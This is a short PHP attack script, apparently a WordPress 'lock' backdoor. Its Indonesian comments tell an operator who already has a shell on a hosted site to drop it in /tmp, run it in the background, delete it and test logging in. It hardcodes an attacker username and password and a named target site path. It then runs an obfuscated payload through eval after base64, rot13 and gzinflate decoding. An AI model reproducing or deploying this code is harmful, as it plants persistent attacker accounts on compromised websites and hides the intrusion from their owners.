<?php
//1. pastikan current_dir nya sesuai dengan letak wp-config.php
//2. cd /tmp -> pindah ke folder /tmp
//3. upload file tsb.
//4. execute  : php wplock.php 2096023362 &
//5. jika loading, maka berhasil, coba akses shell lagi, file run secara background.
//6. jangan lupa file nya di hapus
//7. kita test delete user tadi.
//8. test login

$username = "kucing";
$password = "anjing@@@";
$current_dir = "/home/customer/www/blog.petloverscentre.com/public_html/";
$data = 'jUfvYtowEP2ev8KkRJMIUaDt9m6USDAF0D6gNtWQTcYiJ2WcljZmjsYlrfjfas4PoFvXNlVLtu/dvXv3Eg0YC5jPIAwYl/TB6tg9Wq4sEcSUW1PCHmF50uiTI/tMI/jENJdnevn+5ezK8327l1ew9DgCklgBR0Cj0fhWaFmy0YwIBANB+qTIM+8ubZrmON02ERmINeEZkJXMgciIwEVTnASM0IB4BoenMEI4IDRuLLmz9Pby7l5i6blZGC7rSyBKvVL0jPNDrdEXx0SrZg8sQ+WNNOEJ4kiAtVo4P160apuT/c3R/qa7v+nsYj4t2rpmlgdW2r8ND8sO+0inqq7jHLWJui5NRkVTnOVArYKQWr6SQSUlXoUMHvynhIvMMg8kvVZlmR6YLUXGSWT/l71PkDXckWn5RhQUYEb81yIsZMQ8k5H1O4ng84mfgghFqChuuZJ+Ba1OyFv5IkIElm1+Pp+4rjcY+xczarNOqQ0RMwaU+6lxNeM3E1lTnjuYXnslGi3DdfIEH4J+m45T34fuUgkNkyi6DUv6IejIO2q9ZAks23wJu81jWUlqQuvXEpmndG4W4nFZ8yVcPYBGsP4+jGWAEPPW49h1r89jEGMiAldOY1XV9LRIWQWXAd1azUAq6GqsjJO2VlYVLbks3q3yshIhiPm4PDfN8nUVMMuQ/UGPGPK09qLC2j1vFxG71ovYVBWLyza4KG1r+A8eExiPzXPLkM2mvc2xy/aCQ7tfMp4bZU5+FZ3MjcfFQbDNnmJkVzGjW7D6mOxxKd/omOXVzAyRbrvoxtyXR2Wrkrw4iIAHIX7HUdYideCr4bexj4vyH+LfCVHfWdzB2J0OU5ee2yLd9wDj2bU3nIzRJccd863g2eBl6P/wphee6xcAzm+ofcwgqvuBJQiF2s8l8iCCvcNNK4T1iLb5Aw==';
eval(str_rot13(gzinflate(str_rot13(base64_decode(($data))))));
